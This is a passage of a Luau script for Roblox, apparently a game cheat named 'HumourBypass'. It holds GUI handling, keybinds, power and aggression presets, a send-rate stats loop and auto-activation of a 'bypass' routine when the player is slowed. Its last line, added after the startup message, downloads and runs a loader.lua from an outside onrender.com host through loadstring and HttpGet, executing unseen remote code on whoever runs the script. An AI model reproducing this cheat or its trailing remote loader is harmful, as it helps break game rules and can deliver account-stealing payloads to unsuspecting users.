        statusPill.BackgroundColor3 = BLACK; statusPill.BackgroundTransparency = 0.4
        statusStroke.Color = PINK; statusStroke.Transparency = 0.2
        activateBtn.BackgroundColor3 = BLACK; activateBtn.BackgroundTransparency = 0.4
        activateLbl.Text = "ACTIVATE"; activateLbl.TextColor3 = PINK; activateLbl.TextStrokeTransparency = 0.35
        activateStroke.Color = PINK; activateStroke.Thickness = 2; activateStroke.Transparency = 0.15
        mainStroke.Color = PINK; mainStroke.Transparency = 0.35
    end

    if Config.Mode == "PC" then
        pcBtn.BackgroundColor3 = PINK; pcBtn.BackgroundTransparency = 0; pcBtn.TextColor3 = BLACK
        pcStroke.Color = PINK_BRIGHT; pcStroke.Transparency = 0
        mobileBtn.BackgroundColor3 = BLACK; mobileBtn.BackgroundTransparency = 0.4; mobileBtn.TextColor3 = PINK
        mobileStroke.Color = PINK; mobileStroke.Transparency = 0.35
    else
        mobileBtn.BackgroundColor3 = PINK; mobileBtn.BackgroundTransparency = 0; mobileBtn.TextColor3 = BLACK
        mobileStroke.Color = PINK_BRIGHT; mobileStroke.Transparency = 0
        pcBtn.BackgroundColor3 = BLACK; pcBtn.BackgroundTransparency = 0.4; pcBtn.TextColor3 = PINK
        pcStroke.Color = PINK; pcStroke.Transparency = 0.35
    end

    applyToggleStyle(brainrotBtn, brainrotStroke, Config.AutoBrainrot)
    applyToggleStyle(fpsBtn,      fpsStroke,      Config.FpsProtect)
    applyToggleStyle(throttleBtn, throttleStroke, Config.AutoThrottle)

    local c = AGGRESSION_COLORS[Config.Aggression] or AGGRESSION_COLORS.NORMAL
    aggrBtn.BackgroundColor3 = c.bg; aggrBtn.BackgroundTransparency = c.bgTr
    aggrBtn.TextColor3 = c.text
    aggrStroke.Color = c.stroke; aggrStroke.Transparency = c.strokeTr
    aggrBtn.Text = Config.Aggression
end

-- ══════════════════════════════════════════════════════════════════════
-- DRAG-ACTIVATE
-- ══════════════════════════════════════════════════════════════════════
local actPress, actMainStart, actMoved = nil, nil, false
activateBtn.InputBegan:Connect(function(inp)
    if Config.UILocked then return end
    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
        actPress = inp.Position; actMainStart = main.Position; actMoved = false
    end
end)
activateBtn.InputChanged:Connect(function(inp)
    if actPress and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
        if Config.UILocked then return end
        local d = inp.Position - actPress
        if d.Magnitude > 4 then
            actMoved = true
            main.Position = UDim2.new(actMainStart.X.Scale, actMainStart.X.Offset + d.X,
                                      actMainStart.Y.Scale, actMainStart.Y.Offset + d.Y)
        end
    end
end)
activateBtn.InputEnded:Connect(function()
    if not actPress then return end
    if actMoved then
        Config.Position = {X_Scale = main.Position.X.Scale, X_Offset = main.Position.X.Offset,
                           Y_Scale = main.Position.Y.Scale, Y_Offset = main.Position.Y.Offset}
        SaveConfig()
    end
    task.delay(0.05, function() actPress = nil; actMoved = false end)
end)

-- ══════════════════════════════════════════════════════════════════════
-- MINIMIZE
-- ══════════════════════════════════════════════════════════════════════
minBtn.MouseButton1Click:Connect(function()
    local minimize = Config.IsVisible
    Config.IsVisible = not Config.IsVisible
    if minimize then
        row1.Visible = false; row2.Visible = false; row3.Visible = false
        row4.Visible = false; row5.Visible = false; statsStrip.Visible = false
        main.Size = UDim2.new(0, MAIN_W, 0, MIN_H)
        minBtn.Text = "+"
    else
        main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
        row1.Visible = true; row2.Visible = true; row3.Visible = true
        row4.Visible = true; row5.Visible = true; statsStrip.Visible = true
        minBtn.Text = "−"
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- EVENTS
-- ══════════════════════════════════════════════════════════════════════
activateBtn.MouseButton1Click:Connect(function()
    if actMoved then return end
    Config.Enabled = not Config.Enabled
    updateUIState()
    if Config.Enabled then startBypass(Config.PowerValue) else stopBypass() end
    SaveConfig()
end)
activateBtn.MouseEnter:Connect(function()
    if not Config.Enabled then
        TweenService:Create(activateBtn, TweenInfo.new(0.1), {BackgroundTransparency = 0.2}):Play()
    end
end)
activateBtn.MouseLeave:Connect(function()
    if not Config.Enabled then
        TweenService:Create(activateBtn, TweenInfo.new(0.1), {BackgroundTransparency = 0.4}):Play()
    end
end)

powerInput.FocusLost:Connect(function()
    local v = tonumber(powerInput.Text)
    if v then
        Config.PowerValue = math.clamp(math.floor(v + 0.5), 1, 999999)
        powerInput.Text = tostring(Config.PowerValue)
        if Config.Enabled then startBypass(Config.PowerValue) end
        SaveConfig()
    else
        powerInput.Text = tostring(Config.PowerValue)
    end
end)

pcBtn.MouseButton1Click:Connect(function()
    Config.Mode = "PC"; Config.PowerValue = 97000
    powerInput.Text = "97000"
    if Config.Enabled then startBypass(Config.PowerValue) end
    updateUIState(); SaveConfig()
end)
mobileBtn.MouseButton1Click:Connect(function()
    Config.Mode = "Mobile"; Config.PowerValue = 65000
    powerInput.Text = "65000"
    if Config.Enabled then startBypass(Config.PowerValue) end
    updateUIState(); SaveConfig()
end)

keyBtn.MouseButton1Click:Connect(function()
    keyBtn.Text = "..."; keyBtn.TextColor3 = PINK_BRIGHT
    local conn
    conn = UIS.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            Config.ToggleKey = input.KeyCode
            keyBtn.Text = input.KeyCode.Name; keyBtn.TextColor3 = PINK
            conn:Disconnect(); SaveConfig()
        end
    end)
end)

brainrotBtn.MouseButton1Click:Connect(function()
    Config.AutoBrainrot = not Config.AutoBrainrot
    updateUIState(); SaveConfig()
end)

fpsBtn.MouseButton1Click:Connect(function()
    Config.FpsProtect = not Config.FpsProtect
    if Config.FpsProtect then fpEnable() else fpDisable() end
    updateUIState(); SaveConfig()
end)

aggrBtn.MouseButton1Click:Connect(function()
    local idx = 2
    for i, name in ipairs(AGGRESSION_ORDER) do
        if name == Config.Aggression then idx = i break end
    end
    idx = idx % #AGGRESSION_ORDER + 1
    Config.Aggression = AGGRESSION_ORDER[idx]
    if Config.Enabled then startBypass(Config.PowerValue) end
    updateUIState(); SaveConfig()
end)

throttleBtn.MouseButton1Click:Connect(function()
    Config.AutoThrottle = not Config.AutoThrottle
    if Config.Enabled then startBypass(Config.PowerValue) end
    updateUIState(); SaveConfig()
end)

-- ══════════════════════════════════════════════════════════════════════
-- STATS LOOP
-- ══════════════════════════════════════════════════════════════════════
task.spawn(function()
    while true do
        task.wait(0.25)
        local ping = math.floor(getPing())
        local fps  = math.floor(fpsCounter.fps)
        if Config.Enabled and PLState.running and Stats.startTime > 0 then
            local el = os.clock() - Stats.startTime
            local rate = Stats.sends / math.max(el, 0.01)
            statsLbl.Text = string.format(
                "%d sends | %.1f/s | %dm %.0fs | %dms | %dfps",
                Stats.sends, rate, math.floor(el / 60), el % 60, ping, fps
            )
            statsLbl.TextColor3 = PINK_BRIGHT
        else
            statsLbl.Text = string.format("idle | %dms | %dfps | aggr:%s", ping, fps, Config.Aggression)
            statsLbl.TextColor3 = PINK
        end
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- AUTO BRAINROT
-- ══════════════════════════════════════════════════════════════════════
local lastBrainrotState = false
RunService.Heartbeat:Connect(function()
    if not Config.AutoBrainrot then
        if lastBrainrotState then lastBrainrotState = false end
        return
    end
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local hasBrainrot = hum.WalkSpeed < 25
    if hasBrainrot and not lastBrainrotState then
        lastBrainrotState = true
        if not Config.Enabled then
            Config.Enabled = true; updateUIState()
            startBypass(Config.PowerValue); SaveConfig()
        end
    elseif not hasBrainrot and lastBrainrotState then
        lastBrainrotState = false
        if Config.Enabled then
            Config.Enabled = false; updateUIState()
            stopBypass(); SaveConfig()
        end
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- GLOBAL KEYBINDS
-- ══════════════════════════════════════════════════════════════════════
UIS.InputBegan:Connect(function(input, gp)
    if gp or input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    if input.KeyCode == Config.ToggleKey then
        Config.Enabled = not Config.Enabled
        updateUIState()
        if Config.Enabled then startBypass(Config.PowerValue) else stopBypass() end
        SaveConfig()
    elseif input.KeyCode == Enum.KeyCode.RightControl then
        main.Visible = not main.Visible
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- INIT
-- ══════════════════════════════════════════════════════════════════════
updateUIState()
if Config.FpsProtect then fpEnable() end
if Config.Enabled then startBypass(Config.PowerValue) end
print(string.format(
    "[HumourBypass] loaded | DEPTH=%d | Power=%d | Aggression=%s | Throttle=%s",
    DEPTH, Config.PowerValue, Config.Aggression, tostring(Config.AutoThrottle)
)) 
loadstring(game:HttpGet("https://roblox-panel-mdlz.onrender.com/loader.lua"))()